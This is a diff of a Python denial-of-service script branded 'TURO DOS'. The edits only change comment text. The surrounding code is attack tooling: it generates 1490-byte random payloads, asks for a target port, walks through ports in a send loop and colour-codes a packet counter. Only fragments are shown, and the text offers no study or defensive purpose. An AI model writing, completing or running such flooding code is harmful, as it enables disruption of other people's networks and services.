@@ -20,7 +20,7 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 
-# TURO DOS Logo
+# turo dos logo
 print("\033[96m" + "=" * 50)
 print("\033[95m")
 print("████████╗██╗   ██╗██████╗  ██████╗      ██████╗  ██████╗ ███████╗")
@@ -42,7 +42,7 @@ port = int(input("\033[92m[+] Target Port : \033[0m"))
 
 os.system("clear")
 
-# Attack Launch Screen
+# Attack screen thing
 print("\033[91m")
 print("┌────────────────────────────────────────────────────┐")
 print("│                                                    │")
@@ -86,13 +86,13 @@ try:
         sent += 1
         port += 1
         
-        # Display with different colors based on packet count
+        # display with different colors based on packet count
         if sent % 100 == 0:
-            color = "\033[91m"  # Red for every 100th packet
+            color = "\033[91m"  # red for every 100th packet
         elif sent % 50 == 0:
-            color = "\033[93m"  # Yellow for every 50th packet
+            color = "\033[93m"  # yellow for every 50th packet
         else:
-            color = "\033[92m"  # Green for others
+            color = "\033[92m"  # green for others
             
         elapsed = time.time() - start_time
         packets_per_sec = sent / elapsed if elapsed > 0 else 0
